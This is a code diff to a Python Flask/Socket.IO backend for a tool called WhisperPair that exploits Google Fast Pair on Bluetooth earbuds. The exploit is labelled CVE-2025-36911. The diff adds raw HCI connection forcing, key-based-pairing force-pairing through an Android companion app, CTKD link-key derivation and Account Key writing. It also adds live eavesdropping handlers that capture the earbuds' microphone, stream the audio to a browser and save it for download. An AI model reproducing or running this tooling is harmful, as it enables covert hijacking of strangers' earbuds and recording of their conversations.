@@ -5,12 +5,17 @@ Flask + Socket.IO server wrapping fast_pair_demo.py
 """
 
 import asyncio
+import subprocess
 import threading
 import time
 from datetime import datetime
 from dataclasses import asdict
 
-from flask import Flask, jsonify
+import base64
+import os
+import select
+import socket as sock
+from flask import Flask, jsonify, send_file
 from flask_cors import CORS
 from flask_socketio import SocketIO, emit
 
@@ -142,75 +147,389 @@ def handle_adb_select(data):
     })
 
 
-@socketio.on("adb:pair")
-def handle_adb_pair(data):
+@socketio.on("track:start")
+def handle_track_start(data):
+    mode = data.get("mode", "phone")
+    if mode == "laptop":
+        handle_track_laptop(data)
+    else:
+        handle_track_phone(data)
+
+
+def force_hci_connection(bredr_address):
+    """Send raw HCI Create_Connection to force a Classic BT ACL link.
+    Requires CAP_NET_RAW (run backend with sudo).
+    Returns True if the connection was initiated.
+    """
+    import struct
+    import socket as raw_sock
+
+    try:
+        s = raw_sock.socket(raw_sock.AF_BLUETOOTH, raw_sock.SOCK_RAW, raw_sock.BTPROTO_HCI)
+        s.bind((0,))  # hci0
+
+        addr_bytes = bytes.fromhex(bredr_address.replace(":", ""))[::-1]
+        pkt_type = struct.pack("<H", 0xCC18)
+        page_scan_rep = struct.pack("B", 0x02)  # R2
+        reserved = struct.pack("B", 0x00)
+        clock_offset = struct.pack("<H", 0x0000)
+        allow_role_switch = struct.pack("B", 0x01)
+
+        params = addr_bytes + pkt_type + page_scan_rep + reserved + clock_offset + allow_role_switch
+        cmd = struct.pack("B", 0x01)  # HCI command
+        cmd += struct.pack("<H", 0x0405)  # Create_Connection opcode
+        cmd += struct.pack("B", len(params)) + params
+
+        s.send(cmd)
+        s.close()
+        return True
+    except PermissionError:
+        return False
+    except Exception:
+        return False
+
+
+def handle_track_laptop(data):
+    """Pair with the target device from the laptop using raw HCI for BR/EDR.
+    Requires sudo for raw HCI socket access.
+    """
+    bredr_address = data.get("bredr_address")
+
+    if not bredr_address:
+        emit("track:status", {"stage": "error", "message": "No BR/EDR address provided", "status": "error"})
+        return
+
+    def run_laptop_pair():
+        """Pair via BLE first, then CTKD to derive BR/EDR link key."""
+        from ctkd import perform_ctkd
+
+        ble_address = data.get("ble_address")
+
+        # Step 1: BLE scan + pair to get LTK
+        socketio.emit("track:status", {
+            "stage": "pairing",
+            "message": "Step 1/4: BLE scanning for device...",
+            "status": "running",
+        })
+
+        # Scan to discover the device
+        scan_proc = subprocess.Popen(
+            ["bluetoothctl"], stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
+        )
+        try:
+            scan_proc.stdin.write("scan on\n")
+            scan_proc.stdin.flush()
+            time.sleep(6)
+            scan_proc.stdin.write("scan off\n")
+            scan_proc.stdin.flush()
+            time.sleep(1)
+            scan_proc.stdin.write("quit\n")
+            scan_proc.stdin.flush()
+            scan_proc.wait(timeout=3)
+        except Exception:
+            if scan_proc.poll() is None:
+                scan_proc.terminate()
+
+        # Find the WF-C510 BLE address
+        dev_result = subprocess.run(
+            ["bluetoothctl", "devices"],
+            capture_output=True, text=True, timeout=5,
+        )
+        ble_addr = None
+        for line in dev_result.stdout.splitlines():
+            if "C510" in line:
+                parts = line.split()
+                if len(parts) >= 2:
+                    ble_addr = parts[1]
+                    break
+
+        if not ble_addr:
+            socketio.emit("track:status", {
+                "stage": "complete",
+                "message": "Device not found via BLE scan.",
+                "status": "warning",
+            })
+            return
+
+        socketio.emit("track:status", {
+            "stage": "pairing",
+            "message": f"Step 2/4: BLE pairing with {ble_addr}...",
+            "status": "running",
+        })
+
+        # Pair via BLE
+        pair_proc = subprocess.Popen(
+            ["bluetoothctl"], stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
+        )
+        try:
+            pair_proc.stdin.write("agent on\n")
+            pair_proc.stdin.flush()
+            time.sleep(2)
+            pair_proc.stdin.write("default-agent\n")
+            pair_proc.stdin.flush()
+            time.sleep(1)
+            pair_proc.stdin.write(f"trust {ble_addr}\n")
+            pair_proc.stdin.flush()
+            time.sleep(1)
+            pair_proc.stdin.write(f"pair {ble_addr}\n")
+            pair_proc.stdin.flush()
+            time.sleep(10)
+            pair_proc.stdin.write("quit\n")
+            pair_proc.stdin.flush()
+            pair_proc.communicate(timeout=5)
+        except Exception:
+            if pair_proc.poll() is None:
+                pair_proc.terminate()
+
+        # Check if LE pairing created an LTK
+        check = subprocess.run(
+            ["bluetoothctl", "info", ble_addr],
+            capture_output=True, text=True, timeout=5,
+        )
+        le_paired = "Paired: yes" in check.stdout
+
+        if not le_paired:
+            socketio.emit("track:status", {
+                "stage": "complete",
+                "message": f"BLE pairing with {ble_addr} failed.",
+                "status": "warning",
+            })
+            return
+
+        socketio.emit("track:status", {
+            "stage": "pairing",
+            "message": "Step 3/4: Deriving BR/EDR Link Key via CTKD...",
+            "status": "running",
+        })
+
+        # Step 2: CTKD — derive BR/EDR link key from LE LTK
+        success, msg, link_key_hex = perform_ctkd("C510", bredr_address, "WF-C510")
+
+        socketio.emit("track:status", {
+            "stage": "pairing",
+            "message": msg[:120],
+            "status": "running" if success else "warning",
+        })
+
+        if not success:
+            socketio.emit("track:status", {
+                "stage": "complete",
+                "message": f"CTKD failed: {msg}",
+                "status": "warning",
+            })
+            return
+
+        # Step 3: bluetoothd was restarted by CTKD. Connect with derived key.
+        socketio.emit("track:status", {
+            "stage": "pairing",
+            "message": f"Step 4/4: Connecting to {bredr_address} with derived Link Key...",
+            "status": "running",
+        })
+
+        connect_r = subprocess.run(
+            ["bluetoothctl", "connect", bredr_address],
+            capture_output=True, text=True, timeout=15,
+        )
+
+        socketio.emit("track:status", {
+            "stage": "pairing",
+            "message": f"Connect: {connect_r.stdout.strip()[:80]}",
+            "status": "running",
+        })
+
+        # Verify
+        time.sleep(2)
+        check = subprocess.run(
+            ["bluetoothctl", "info", bredr_address],
+            capture_output=True, text=True, timeout=5,
+        )
+        is_paired = "Paired: yes" in check.stdout
+        is_connected = "Connected: yes" in check.stdout
+
+        if is_connected:
+            socketio.emit("track:status", {
+                "stage": "complete",
+                "message": f"Laptop connected to {bredr_address} via CTKD! Link Key derived from LE bond.",
+                "status": "success",
+                "bredr_address": bredr_address,
+            })
+        elif is_paired:
+            socketio.emit("track:status", {
+                "stage": "complete",
+                "message": f"Link Key injected. Device paired but not connected. Try again or check audio profiles.",
+                "status": "success",
+                "bredr_address": bredr_address,
+            })
+        else:
+            socketio.emit("track:status", {
+                "stage": "complete",
+                "message": f"CTKD derived key injected but connection failed. The device may have rejected the derived key.",
+                "status": "warning",
+            })
+
+    thread = threading.Thread(target=run_laptop_pair, daemon=True)
+    thread.start()
+
+
+def handle_track_phone(data):
+    """Launch the companion app on the Android phone to perform Fast Pair KBP."""
     device_id = data.get("device_id") or selected_adb_device
-    br_edr_address = data.get("br_edr_address")
+    ble_address = data.get("ble_address")
+    bredr_address = data.get("bredr_address")
 
     if not device_id:
-        emit("adb:status", {
+        emit("track:status", {
             "stage": "error",
-            "message": "No Android phone selected",
+            "message": "No Android phone connected via ADB",
             "status": "error",
         })
         return
 
-    if not br_edr_address:
-        emit("adb:status", {
+    if not ble_address:
+        emit("track:status", {
             "stage": "error",
-            "message": "No BR/EDR address provided",
+            "message": "No target BLE address available",
             "status": "error",
         })
         return
 
-    def run_adb_pair():
-        socketio.emit("adb:status", {
-            "stage": "enabling_bt",
-            "message": f"Enabling Bluetooth on {device_id}...",
+    def run_companion_pair():
+        # Step 1: Remove device from laptop's Bluetooth so only the phone pairs
+        socketio.emit("track:status", {
+            "stage": "cleanup",
+            "message": "Removing target from laptop Bluetooth...",
             "status": "running",
         })
-        adb.enable_bluetooth(device_id)
+        subprocess.run(["bluetoothctl", "remove", ble_address],
+                       capture_output=True, text=True, timeout=10)
+        if bredr_address:
+            subprocess.run(["bluetoothctl", "remove", bredr_address],
+                           capture_output=True, text=True, timeout=10)
 
-        socketio.emit("adb:status", {
-            "stage": "pairing",
-            "message": f"Pairing {device_id} with {br_edr_address}...",
+        # Step 2: Snapshot bonded devices on phone
+        bonded_before = adb.get_bonded_addresses(device_id)
+
+        # Step 3: Launch companion app on phone with BLE + BR/EDR addresses
+        socketio.emit("track:status", {
+            "stage": "launching",
+            "message": f"Launching WhisperPair companion — BLE: {ble_address}, BR/EDR: {bredr_address or 'auto'}...",
             "status": "running",
         })
-        paired = adb.pair_device(device_id, br_edr_address)
 
-        if not paired:
-            socketio.emit("adb:status", {
-                "stage": "pairing",
-                "message": "ADB pairing command failed",
+        cmd = ["adb", "-s", device_id, "shell", "am", "start",
+               "-a", "com.whisperpair.PAIR",
+               "--es", "address", ble_address]
+        if bredr_address:
+            cmd.extend(["--es", "bredr_address", bredr_address])
+
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+
+        if result.returncode != 0:
+            socketio.emit("track:status", {
+                "stage": "complete",
+                "message": f"Failed to launch companion app: {result.stderr.strip()}. "
+                           "Install it first: adb install android/app/build/outputs/apk/debug/app-debug.apk",
                 "status": "error",
             })
             return
 
-        socketio.emit("adb:status", {
-            "stage": "verifying",
-            "message": "Verifying device registration...",
+        socketio.emit("track:status", {
+            "stage": "exploiting",
+            "message": "Companion app running KBP exploit from phone. Watch phone screen for progress...",
             "status": "running",
         })
 
-        time.sleep(3)
-        verified = adb.verify_paired(device_id, br_edr_address)
+        # Step 4: Monitor logcat for companion app output
+        logcat_proc = subprocess.Popen(
+            ["adb", "-s", device_id, "logcat", "-s", "WhisperPair:D", "-v", "brief"],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
+        )
 
-        if verified:
-            socketio.emit("adb:status", {
+        kbp_accepted = False
+        account_key_written = False
+        classic_paired = False
+        start_time = time.time()
+        timeout = 60  # 60 seconds max
+
+        try:
+            import select
+            while time.time() - start_time < timeout:
+                ready, _, _ = select.select([logcat_proc.stdout], [], [], 2.0)
+                if ready:
+                    line = logcat_proc.stdout.readline().strip()
+                    if not line:
+                        continue
+
+                    # Parse log messages from companion app
+                    msg = line.split(":", 1)[-1].strip() if ":" in line else line
+
+                    if "KBP ACCEPTED" in msg:
+                        kbp_accepted = True
+                        socketio.emit("track:status", {
+                            "stage": "kbp_accepted",
+                            "message": "KBP accepted from phone — device is vulnerable!",
+                            "status": "success",
+                        })
+                    elif "Account Key written" in msg:
+                        account_key_written = True
+                        socketio.emit("track:status", {
+                            "stage": "account_key",
+                            "message": msg,
+                            "status": "success",
+                        })
+                    elif "Device bonded" in msg or "BOND_BONDED" in msg or "Classic BT paired" in msg:
+                        classic_paired = True
+                        socketio.emit("track:status", {
+                            "stage": "paired",
+                            "message": msg,
+                            "status": "success",
+                        })
+                    elif "EXPLOIT COMPLETE" in msg:
+                        classic_paired = True
+                        break
+                    elif "PARTIAL SUCCESS" in msg:
+                        break
+                    elif "ERROR" in msg or "rejected" in msg.lower():
+                        socketio.emit("track:status", {
+                            "stage": "exploiting",
+                            "message": msg,
+                            "status": "warning",
+                        })
+
+                # Also check bond state
+                if not classic_paired:
+                    if adb.verify_new_bond(device_id, bonded_before):
+                        classic_paired = True
+        finally:
+            logcat_proc.terminate()
+            logcat_proc.wait(timeout=5)
+
+        # Report final status
+        if classic_paired:
+            socketio.emit("track:status", {
                 "stage": "complete",
-                "message": "Device paired and registered with Find My Device",
+                "message": "Device force-paired with phone via CVE-2025-36911! "
+                           "Phone now has full audio access to the target earbuds.",
                 "status": "success",
-                "br_edr_address": br_edr_address,
+                "bredr_address": bredr_address or ble_address,
+            })
+        elif kbp_accepted:
+            socketio.emit("track:status", {
+                "stage": "complete",
+                "message": "KBP accepted (device is vulnerable) but Classic BT bond did not complete. "
+                           "The device may need to be closer to the phone, or try again.",
+                "status": "warning",
             })
         else:
-            socketio.emit("adb:status", {
+            socketio.emit("track:status", {
                 "stage": "complete",
-                "message": "Pairing sent but could not verify registration. Check your phone manually.",
+                "message": "Companion app did not complete. Check the phone screen for details or permissions prompt.",
                 "status": "warning",
-                "br_edr_address": br_edr_address,
             })
 
-    thread = threading.Thread(target=run_adb_pair, daemon=True)
+    thread = threading.Thread(target=run_companion_pair, daemon=True)
     thread.start()
 
 
@@ -561,6 +880,7 @@ async def _run_exploit_chain(address: str, strategies: list):
         account_key = bytearray(16)
         account_key[0] = 0x04
         account_key[1:16] = secrets.token_bytes(15)
+        result["account_key"] = account_key.hex()
 
         if shared_secret:
             data_to_write = aes_encrypt(shared_secret, bytes(account_key))
@@ -570,7 +890,7 @@ async def _run_exploit_chain(address: str, strategies: list):
         try:
             await client.write_gatt_char(CHAR_ACCOUNT_KEY, data_to_write, response=True)
             result["account_key_written"] = True
-            stage("account_key", "Account Key written successfully", "success")
+            stage("account_key", f"Account Key written successfully: {account_key.hex()}", "success")
         except Exception as e:
             stage("account_key", f"Account Key write failed: {e}", "warning")
 
@@ -579,24 +899,12 @@ async def _run_exploit_chain(address: str, strategies: list):
         client = None
         stage("disconnect", "BLE disconnected", "success")
 
-        # Step 8: Classic Bluetooth pairing
-        if exploit_cancel.is_set():
-            return
-        stage("bt_pair", f"Initiating Classic Bluetooth pairing with {br_edr_address}...")
-
-        result["paired"] = pair_classic_bluetooth(br_edr_address)
-        if result["paired"]:
-            stage("bt_pair", "Classic Bluetooth pairing successful", "success")
-            stage("bt_connect", "Connecting via Classic Bluetooth...")
-            connected = connect_classic_bluetooth(br_edr_address)
-            stage("bt_connect",
-                  "Connected" if connected else "Connection failed (pairing still valid)",
-                  "success" if connected else "warning")
-        else:
-            stage("bt_pair", "Classic Bluetooth pairing failed", "warning")
+        # Skip Classic BT pairing from laptop — the companion app on
+        # the phone will handle pairing via the Track button.
+        result["paired"] = False
 
         # Final result
-        result["success"] = result["vulnerable"] and (result["paired"] or result["account_key_written"])
+        result["success"] = result["vulnerable"] and result["account_key_written"]
         result["notifications"] = notifications
         result["message"] = "Exploit successful!" if result["success"] else "Partial success - device is vulnerable"
 
@@ -785,6 +1093,409 @@ async def _run_vuln_test(address: str, strategies: list):
                 await client.disconnect()
             except Exception:
                 pass
+
+
+# ==============================================================================
+# LIVE EAVESDROP
+# ==============================================================================
+
+last_eavesdrop_file = None
+eavesdrop_logcat = None
+eavesdrop_proc = None  # For laptop mode parecord process
+
+
+@app.route("/api/eavesdrop/download")
+def download_eavesdrop():
+    if last_eavesdrop_file and os.path.exists(last_eavesdrop_file):
+        return send_file(last_eavesdrop_file, as_attachment=True,
+                         download_name="eavesdrop_recording.wav")
+    return jsonify({"error": "No recording available"}), 404
+
+
+@socketio.on("eavesdrop:start")
+def handle_eavesdrop_start(data):
+    mode = data.get("mode", "phone")
+    if mode == "laptop":
+        handle_eavesdrop_laptop(data)
+    else:
+        handle_eavesdrop_phone(data)
+
+
+def handle_eavesdrop_laptop(data):
+    """Record from BT mic using PipeWire on the laptop."""
+    global last_eavesdrop_file, eavesdrop_proc
+
+    address = data.get("address")
+    if not address:
+        socketio.emit("eavesdrop:status", {"stage": "error", "message": "No target address", "status": "error"})
+        return
+
+    def run_laptop_eavesdrop():
+        global last_eavesdrop_file, eavesdrop_proc
+
+        socketio.emit("eavesdrop:status", {
+            "stage": "launching",
+            "message": "Finding Bluetooth audio source...",
+            "status": "running",
+        })
+
+        # Find BT audio source via wpctl / pw-cli
+        bt_source = None
+        addr_nodash = address.replace(":", "_")
+
+        result = subprocess.run(
+            ["wpctl", "status"],
+            capture_output=True, text=True, timeout=5,
+        )
+        for line in result.stdout.splitlines():
+            if "bluez" in line.lower() and "source" in line.lower().split("bluez")[0]:
+                # Extract node ID
+                stripped = line.strip()
+                if stripped and stripped[0].isdigit():
+                    node_id = stripped.split(".")[0].strip()
+                    bt_source = node_id
+                    break
+
+        # If no source found, try setting HFP profile first
+        if not bt_source:
+            socketio.emit("eavesdrop:status", {
+                "stage": "launching",
+                "message": "Switching to HFP profile for mic access...",
+                "status": "running",
+            })
+            # Find bluez card in wpctl and set to headset profile
+            in_audio = False
+            for line in result.stdout.splitlines():
+                if "Audio" in line:
+                    in_audio = True
+                if in_audio and "bluez" in line.lower():
+                    stripped = line.strip()
+                    if stripped and stripped[0].isdigit():
+                        card_id = stripped.split(".")[0].strip()
+                        subprocess.run(
+                            ["wpctl", "set-profile", card_id, "1"],  # headset-head-unit
+                            capture_output=True, text=True, timeout=5,
+                        )
+                        time.sleep(2)
+                        break
+
+            # Retry
+            result2 = subprocess.run(["wpctl", "status"], capture_output=True, text=True, timeout=5)
+            for line in result2.stdout.splitlines():
+                if "bluez" in line.lower() and ("source" in line.lower() or "input" in line.lower()):
+                    stripped = line.strip()
+                    if stripped and stripped[0].isdigit():
+                        bt_source = stripped.split(".")[0].strip()
+                        break
+
+        if not bt_source:
+            socketio.emit("eavesdrop:status", {
+                "stage": "error",
+                "message": "No Bluetooth audio source found. Make sure the device is connected with HFP profile.",
+                "status": "error",
+            })
+            return
+
+        socketio.emit("eavesdrop:status", {
+            "stage": "recording",
+            "message": f"LIVE — recording from BT source (node {bt_source})",
+            "status": "running",
+        })
+
+        # Record to WAV file
+        local_path = os.path.join(os.path.dirname(__file__), "eavesdrop_recording.wav")
+
+        # pw-record saves to file; pw-cat streams to stdout
+        rec_proc = subprocess.Popen(
+            ["pw-record", "--channels=1", "--rate=8000", "--format=s16", local_path],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+        )
+        eavesdrop_proc = rec_proc
+
+        # Stream raw PCM to browser via pw-cat
+        stream_proc = subprocess.Popen(
+            ["pw-cat", "--record", "--channels=1", "--rate=8000", "--format=s16"],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+        )
+
+        start_time = time.time()
+
+        try:
+            while rec_proc.poll() is None:
+                chunk = stream_proc.stdout.read(4096)
+                if not chunk:
+                    break
+
+                socketio.emit("eavesdrop:audio", {
+                    "pcm": base64.b64encode(chunk).decode("ascii"),
+                    "rate": 8000,
+                    "channels": 1,
+                    "bits": 16,
+                })
+
+                # VU meter
+                elapsed = int(time.time() - start_time)
+                ts = f"{elapsed // 60:02d}:{elapsed % 60:02d}"
+                max_amp = 0
+                for i in range(0, len(chunk) - 1, 2):
+                    s = abs(int.from_bytes(chunk[i:i+2], 'little', signed=True))
+                    if s > max_amp:
+                        max_amp = s
+                bars = min(max_amp // 500, 20)
+                vu = "\u2588" * bars + "\u2591" * (20 - bars)
+                socketio.emit("eavesdrop:status", {
+                    "stage": "recording",
+                    "message": f"{ts} {vu} {max_amp}",
+                    "status": "running",
+                })
+        finally:
+            if stream_proc.poll() is None:
+                stream_proc.terminate()
+            if rec_proc.poll() is None:
+                rec_proc.terminate()
+                rec_proc.wait(timeout=5)
+            eavesdrop_proc = None
+
+        if os.path.exists(local_path):
+            size = os.path.getsize(local_path)
+            last_eavesdrop_file = local_path
+            socketio.emit("eavesdrop:status", {
+                "stage": "complete",
+                "message": f"Recording saved — {size // 1024}KB captured from BT mic.",
+                "status": "success",
+                "download_url": "/api/eavesdrop/download",
+            })
+        else:
+            socketio.emit("eavesdrop:status", {
+                "stage": "complete",
+                "message": "Eavesdrop stopped.",
+                "status": "warning",
+            })
+
+    thread = threading.Thread(target=run_laptop_eavesdrop, daemon=True)
+    thread.start()
+
+
+def handle_eavesdrop_phone(data):
+    global last_eavesdrop_file, eavesdrop_logcat
+
+    device_id = data.get("device_id") or selected_adb_device
+    address = data.get("address")
+
+    if not device_id:
+        socketio.emit("eavesdrop:status", {"stage": "error", "message": "No ADB phone connected", "status": "error"})
+        return
+    if not address:
+        socketio.emit("eavesdrop:status", {"stage": "error", "message": "No target address", "status": "error"})
+        return
+
+    def run_live_eavesdrop():
+        global last_eavesdrop_file, eavesdrop_logcat
+
+        subprocess.run(["adb", "-s", device_id, "logcat", "-c"],
+                       capture_output=True, text=True, timeout=5)
+
+        socketio.emit("eavesdrop:status", {
+            "stage": "launching",
+            "message": f"Opening live eavesdrop on {address}...",
+            "status": "running",
+        })
+
+        # Launch eavesdrop activity
+        result = subprocess.run(
+            ["adb", "-s", device_id, "shell", "am", "start",
+             "-a", "com.whisperpair.EAVESDROP",
+             "--es", "address", address],
+            capture_output=True, text=True, timeout=10,
+        )
+        if result.returncode != 0:
+            socketio.emit("eavesdrop:status", {
+                "stage": "error",
+                "message": f"Failed to launch: {result.stderr.strip()}",
+                "status": "error",
+            })
+            return
+
+        # Set up ADB port forwarding for audio stream
+        subprocess.run(
+            ["adb", "-s", device_id, "forward", "tcp:19876", "tcp:19876"],
+            capture_output=True, text=True, timeout=5,
+        )
+
+        # Start logcat monitor
+        eavesdrop_stopping.clear()
+        logcat_proc = subprocess.Popen(
+            ["adb", "-s", device_id, "logcat", "-s", "WhisperPair:D", "-v", "brief"],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
+        )
+        eavesdrop_logcat = logcat_proc
+
+        # Start audio stream reader in separate thread
+        audio_thread = threading.Thread(target=stream_audio_to_browser, daemon=True)
+        audio_thread.start()
+
+        try:
+            while logcat_proc.poll() is None and not eavesdrop_stopping.is_set():
+                ready, _, _ = select.select([logcat_proc.stdout], [], [], 1.0)
+                if not ready:
+                    continue
+                line = logcat_proc.stdout.readline().strip()
+                if not line:
+                    continue
+                msg = line.split(":", 1)[-1].strip() if ":" in line else line
+
+                if "EAVESDROP_VU" in msg:
+                    socketio.emit("eavesdrop:status", {
+                        "stage": "recording",
+                        "message": msg.replace("EAVESDROP_VU ", ""),
+                        "status": "running",
+                    })
+                elif "EAVESDROP_LIVE_STARTED" in msg:
+                    socketio.emit("eavesdrop:status", {
+                        "stage": "recording",
+                        "message": "LIVE — streaming earbuds mic to browser",
+                        "status": "running",
+                    })
+                elif "EAVESDROP_STOPPED" in msg:
+                    break
+                elif "SCO connected" in msg:
+                    socketio.emit("eavesdrop:status", {
+                        "stage": "recording",
+                        "message": "SCO connected — mic active!",
+                        "status": "running",
+                    })
+                elif "ERROR" in msg:
+                    socketio.emit("eavesdrop:status", {
+                        "stage": "error", "message": msg, "status": "error",
+                    })
+        finally:
+            if logcat_proc.poll() is None:
+                logcat_proc.terminate()
+                logcat_proc.wait(timeout=5)
+            eavesdrop_logcat = None
+
+    thread = threading.Thread(target=run_live_eavesdrop, daemon=True)
+    thread.start()
+
+
+def stream_audio_to_browser():
+    """Connect to the Android app's TCP audio stream and forward
+    raw PCM chunks to the browser via Socket.IO."""
+    time.sleep(3)  # Wait for the app to start the server
+
+    try:
+        s = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect(("127.0.0.1", 19876))
+        s.settimeout(1)
+    except Exception as e:
+        socketio.emit("eavesdrop:status", {
+            "stage": "recording",
+            "message": f"Audio stream: could not connect ({e})",
+            "status": "warning",
+        })
+        return
+
+    socketio.emit("eavesdrop:status", {
+        "stage": "recording",
+        "message": "Audio stream connected — playing in browser",
+        "status": "running",
+    })
+
+    try:
+        while True:
+            try:
+                data = s.recv(4096)
+                if not data:
+                    break
+                # Send raw PCM as base64 to browser
+                socketio.emit("eavesdrop:audio", {
+                    "pcm": base64.b64encode(data).decode("ascii"),
+                    "rate": 8000,
+                    "channels": 1,
+                    "bits": 16,
+                })
+            except sock.timeout:
+                continue
+            except Exception:
+                break
+    finally:
+        s.close()
+
+
+eavesdrop_stopping = threading.Event()
+
+
+@socketio.on("eavesdrop:stop")
+def handle_eavesdrop_stop():
+    global eavesdrop_logcat, eavesdrop_proc
+    device_id = selected_adb_device
+
+    # Signal the logcat thread to stop
+    eavesdrop_stopping.set()
+
+    # Stop laptop mode recording if active
+    if eavesdrop_proc and eavesdrop_proc.poll() is None:
+        eavesdrop_proc.terminate()
+        eavesdrop_proc = None
+
+    socketio.emit("eavesdrop:status", {
+        "stage": "stopping",
+        "message": "Stopping eavesdrop...",
+        "status": "running",
+    })
+
+    if device_id:
+        # Send stop broadcast to the app
+        subprocess.run(
+            ["adb", "-s", device_id, "shell", "am", "broadcast",
+             "-a", "com.whisperpair.STOP_EAVESDROP"],
+            capture_output=True, text=True, timeout=5,
+        )
+
+        # Kill logcat monitor
+        if eavesdrop_logcat and eavesdrop_logcat.poll() is None:
+            eavesdrop_logcat.terminate()
+            eavesdrop_logcat = None
+
+        # Remove port forward
+        subprocess.run(
+            ["adb", "-s", device_id, "forward", "--remove", "tcp:19876"],
+            capture_output=True, text=True, timeout=5,
+        )
+
+    # Pull recording in background
+    def pull_recording():
+        global last_eavesdrop_file
+        time.sleep(2)
+
+        if not device_id:
+            return
+
+        recording_file = "/storage/emulated/0/Android/data/com.whisperpair.companion/files/eavesdrop_live.wav"
+        local_path = os.path.join(os.path.dirname(__file__), "eavesdrop_recording.wav")
+        pull_result = subprocess.run(
+            ["adb", "-s", device_id, "pull", recording_file, local_path],
+            capture_output=True, text=True, timeout=15,
+        )
+
+        if pull_result.returncode == 0 and os.path.exists(local_path):
+            size = os.path.getsize(local_path)
+            last_eavesdrop_file = local_path
+            socketio.emit("eavesdrop:status", {
+                "stage": "complete",
+                "message": f"Recording saved — {size // 1024}KB captured from earbuds mic.",
+                "status": "success",
+                "download_url": "/api/eavesdrop/download",
+            })
+        else:
+            socketio.emit("eavesdrop:status", {
+                "stage": "complete",
+                "message": "Eavesdrop stopped.",
+                "status": "warning",
+            })
+
+    threading.Thread(target=pull_recording, daemon=True).start()
 
 
 if __name__ == "__main__":
